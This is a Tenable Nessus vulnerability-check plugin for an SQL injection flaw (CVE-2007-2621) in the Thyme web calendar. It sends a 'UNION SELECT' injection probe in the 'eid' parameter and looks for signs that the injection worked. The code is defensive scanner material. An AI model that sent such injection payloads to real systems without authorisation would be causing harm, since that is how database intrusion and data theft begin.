#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(25199);
  script_version("$Revision: 1.20 $");

  script_cve_id("CVE-2007-2621");
  script_bugtraq_id(23912);
  script_osvdb_id(35971);
  script_xref(name:"EDB-ID", value:"3895");

  script_name(english:"Thyme event_view.php eid Parameter SQL Injection");
  script_summary(english:"Tries to generate a SQL error");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Thyme, a web-based calendar. 

The version of Thyme installed on the remote host fails to properly
sanitize user-supplied input to the 'eid' parameter of the
'event_view.php' script before using it to build a database query. 
Regardless of PHP's 'magic_quotes_gpc' setting, an unauthenticated
remote attacker can leverage this issue to launch SQL injection
attacks against the affected application, leading to discovery of
sensitive information, attacks against the underlying database, and
the like." );
  # http://web.archive.org/web/20070820052648/http://www.extrosoft.com/?option=com_content&task=view&id=171
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?fde97c70" );
 script_set_attribute(attribute:"solution", value:
"Update Thyme as described in the vendor advisory referenced above." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/05/11");
 script_set_attribute(attribute:"vuln_publication_date", value: "2007/05/10");
 script_cvs_date("$Date: 2016/05/19 18:02:20 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:extrovert_software:thyme_calndar");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/thyme", "/events", "/schedule", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the flaw to manipulate the main text.
  magic = rand();
  exploit = string("34 UNION SELECT ", magic);

  w = http_send_recv3(method:"GET",
    item:string(
      dir, "/event_view.php?",
      "eid=", urlencode(str:exploit)
    ), 
    port:port
  );
  if (isnull(w)) exit(1, "the web server did not answer");
  res = w[2];

  # There's a problem if...
  if (
    # We saw an attachment with our magic or...
    string("/download_attachment.php?aid=", magic, "'") >< res ||
    # We saw an error from PostgreSQL.
    string('class.pgsql.php :: query() :: ERROR:  invalid input syntax for type bigint: "', exploit) >< res
  )
  {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
